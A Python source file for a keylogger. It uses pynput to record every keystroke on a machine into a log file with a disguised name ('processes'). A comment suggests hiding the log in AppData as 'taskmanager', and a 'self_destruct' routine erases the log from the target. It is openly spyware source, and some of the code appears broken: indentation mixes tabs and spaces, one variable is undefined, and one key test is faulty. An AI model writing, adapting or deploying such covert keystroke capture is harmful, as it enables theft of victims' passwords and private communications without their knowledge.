#!/usr/bin/python3

import os
from pynput.keyboard import Listener, Key

#import threading


#keys = []
#flag = 0
#counter = 0

#win_path = os.environ['appdata'] + '\\taskmanager'   # For Windows, we can hide the file in the appdata directory:
						     # C:\Users\<usernme>\AppData\Roaming\\taskmanager
#lnx_path = "processes"

def on_press(key):


	global keys
	global flag
	global counter
	global lnx_path

	keys = []
	flag = 0
	counter = 0

	lnx_path = "processes"


	keys.append(key)
	counter += 1

	if counter >= 1:

		counter = 0
		write_file(keys)
		keys = []


# Kelogger captured key pattern
def write_file(keys):
	with open(lnx_path, 'a') as file:
		for key in keys:
			k = str(key).replace("'", "")     # To avoid: 'U''D''P' -> Instead: UDP
			# Backspace Key

			if k.find('backspace') > 0:
				file.write(' <Backspace> ')

			# Enter Key

			elif k.find('enter') > 0:
				file.write('\n')

			# Shift key

			elif k.find('shift_r') > 0:
				file.write(' <R_shift> ')     # space is used in front and end :
	                                                      # To avoid this -> I would tell you a<R_Shift>UDP joke but
	                                                      #                  you might not get it
	                                                      # Instead, we will get -> I would tell you a <R_Shift> UDP joke but
	                                                      #                         you might not get it
			elif k.find('shift') > 0:
				file.write(' <L_shift> ')

			# Alt Key

			elif k.find('alt_gr') > 0:
				file.write('\n <altgr> ')
			elif k.find('alt_r') > 0:
				file.write('\n <R_alt> ')
			elif k.find('alt') > 0:
				file.write('\n <L_alt ')

			# Super Key

			elif k.find('cmd_r') > 0:
				file.write('\n Pressed [right] Super Key ')
			elif k.find('cmd') > 0:
				file.write('\n Pressed [left] Super Key ')

			# Delete key

			elif k.find('delete') > 0:
				file.write(' <delete> ')
				# add number of delete with characters

			# Home, End, page Up/Down

			elif k.find('page_up') > 0:
				file.write(' <pg up> ')
			elif k.find('page_down') > 0:
				file.write(' <pg dn> ')
			elif k.find('home') > 0:
				file.write(' <home> ')
			elif k.find('end') > 0:
				file.write(' <end> ')

			# Arrow Keys

			elif k.find('left') > 0:
				file.write(' [<- key] ')
			elif k.find('right') > 0:
				file.write(' [-> key] ')
			elif k.find('up') > 0:
				file.write(' [up_arrow_key] ')
			elif k.find('down') > 0:
				file.write(' [down_arrow_key] ')

			# Space Key

			elif k.find('space') > 0:
				file.write(' ')

			# Capslock

			elif k.find('caps_lock') > 0:
				file.write(' <caps_lock> ')

			# Tab

			elif k.find('tab') > 0:
				file.write(' <tab> ')

			# Esc key

			elif k.find('esc') > 0:
				file.write(' <esc key> ')

			# Print Screen

			elif k.find('print_screen') > 0:
				file.write(' <prnt scrn> ')

			# Ctrl

			elif k.find('ctrl_r') > 0:
				file.write(' <R_ctrl> ')

			elif k.find('ctrl') > 0:
				file.write(' <L_ctrl> ')


			# Media keys

			elif k.find('media_Play_pause')  > 0:
				file.write('\n [media_play_pause/>|| key] ')
				# Add sound capture
			elif k.find('media_next') > 0:
				file.write('\n [media_next/>>| key] ')
			elif k.find('media_previous') > 0:
				file.write('\n [media_previous/|<< key] ')


			# Media Volumn lvl

			elif k.find('media_volume_up') > 0:
				file.write('\n [Volumn up] ')
			elif k.find('media_volume_down') > 0:
				file.write('\n [Volumn down] ')
			elif k.find('media_volume_mute') > 0:
				file.write('\n [Volumn mute] ')

			# num_lock

			elif k.find('num_lock') > 0:
				file.write('\n <num_lock> ')

			# insert key

			elif k.find('insert') > 0:
				file.write('\n <insert> ')

			# Scroll lock

			elif k.find('scroll_lock') > 0:
				file.write('\n <scroll lock> ')

			# f1-20 keys

			elif k.find('f1') > 0:
				file.write('\n <f1> ')
			elif k.find('f2') > 0:
	                        file.write('\n <f2> ')
			elif k.find('f3') > 0:
	                        file.write('\n <f3> ')
			elif k.find('f4') > 0:
	                        file.write('\n <f4> ')
			elif k.find('f5') > 0:
	                        file.write('\n <f5> ')
			elif k.find('f6') > 0:
	                        file.write('\n <f6> ')
			elif k.find('f7') > 0:
	                        file.write('\n <f7> ')
			elif k.find('f8') > 0:
	                        file.write('\n <f8> ')
			elif k.find('f9') > 0:
	                        file.write('\n <f9> ')
			elif k.find('f10') > 0:
	                        file.write('\n <f10> ')
			elif k.find('f11') > 0:
	                        file.write('\n <f11> ')
			elif k.find('f12') > 0:
	                        file.write('\n <f12> ')
			elif k.find('f13') > 0:
	                        file.write('\n <f13> ')
			elif k.find('f14') > 0:
	                        file.write('\n <f14> ')
			elif k.find('f15') > 0:
	                        file.write('\n <f15> ')
			elif k.find('f16') > 0:
	                        file.write('\n <f16> ')
			elif k.find('f17') > 0:
	                        file.write('\n <f17> ')
			elif k.find('f18') > 0:
	                        file.write('\n <f18> ')
			elif k.find('f19') > 0:
	                        file.write('\n <f19> ')
			elif k.find('f20') > 0:
	                        file.write('\n <f20> ')


			# Any other key

			elif k.find('Key'):
				file.write(k)


def keylog_start():

	with Listener(on_press=on_press) as listener:  # Starting Keylogger
		listener.join()

def key_dump():

	with open(lnx_path, 'rt') as f:

		dump = f.read()
		print(dump)                           # keystroke dumping


def keylog_off_self_destruct():

	listener.stop()                               # Stops storing keystrokes
	os.remove(lnx_path)                           # removes file from trgt


